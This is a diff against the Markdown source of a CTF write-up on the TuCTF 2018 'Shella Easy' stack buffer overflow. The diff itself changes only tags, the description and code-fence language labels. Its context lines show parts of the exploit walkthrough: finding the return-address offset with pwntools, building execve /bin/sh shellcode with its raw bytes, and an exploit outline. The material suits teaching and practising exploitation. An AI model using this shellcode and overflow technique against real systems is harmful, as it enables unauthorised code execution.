@@ -1,7 +1,7 @@
 +++
-categories = ["Linux","Stack Overflow","Capture the Flag"]
+categories = ["Stack BOF","CTF","Linux"]
 date = "2021-08-11"
-description = "TuCTF 2018 'Shella Easy' challenge."
+description = "TuCTF 2018 'Shella Easy' challenge writeup."
 featuredpath = "date"
 linktitle = ""
 title = "TuCTF 2018 :: Shella Easy"
@@ -151,7 +151,7 @@ Now let's find the location of the function's return address stored on the stack
 
 We can write a quick script using pwntools that sends a cyclic pattern of bytes (with the `var_8h` variable overwritten with `0xdeadbeef`) that we can use to determine the location of the return address. 
 
-```
+```py
 #!/usr/bin/env python3
 
 from pwn import *
@@ -176,7 +176,7 @@ $1 = (void (*)()) 0x61616163
 
 We can use pwntools' `cyclic_find` function and the bytes contained within `eip` above, in order to find the offset of the return address from the end of our payload. 
 
-```
+```py
 In [2]: cyclic_find(0x61616163)
 Out[2]: 8
 ```
@@ -213,7 +213,7 @@ $ gcc -nostdlib -static shellcode.s -o shellcode -m32
 $ objcopy --dump-section .text=payload shellcode
 ```
 
-```
+```py
 In [1]: open('payload','rb').read()
 Out[1]: b'h/sh\x00h/bin\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80'
 ```
@@ -224,7 +224,7 @@ Now we can build our exploit. Here is an outline of what we want to achieve:
  - Overwrite the return address using the leak.
  - Get code execution.
 
-```
+```py
 #!/usr/bin/env python3
 
 from pwn import *
